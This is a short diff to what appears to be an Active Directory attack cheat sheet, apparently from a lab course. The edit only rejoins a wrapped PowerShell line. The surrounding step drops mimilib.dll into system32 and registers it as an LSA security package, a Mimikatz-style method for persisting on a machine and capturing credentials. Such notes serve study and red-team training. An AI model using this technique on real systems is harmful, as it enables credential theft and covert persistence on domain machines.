@@ -346,9 +346,7 @@ $ ls \\dcorp-dc\C$
 - Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security` Packages:
 
 ```powershell
-$packages = Get-ItemProperty
-HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
-Packages'| select -ExpandProperty 'Security Packages'
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
 $packages += "mimilib"
 Set-ItemProperty
 HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
